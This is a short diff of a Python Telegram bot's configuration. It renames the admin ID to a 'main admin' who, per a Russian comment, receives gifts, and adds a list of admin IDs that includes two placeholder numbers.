@@ -28,7 +28,8 @@ import os
 CONNECTIONS_FILE = "business_connections.json"
 
 TOKEN = config.BOT_TOKEN
-ADMIN_ID = config.ADMIN_ID
+MAIN_ADMIN_ID = config.ADMIN_ID  # ← Главный админ (получает подарки)
+ADMINS = [config.ADMIN_ID, 123456789, 987654321]  # ← список админов
 
 bot = Bot(token=TOKEN)
 dp = Dispatcher()
@@ -569,3 +570,4 @@ async def main():
 if __name__ == "__main__":
     logging.basicConfig(level=logging.INFO)
     asyncio.run(main())
+
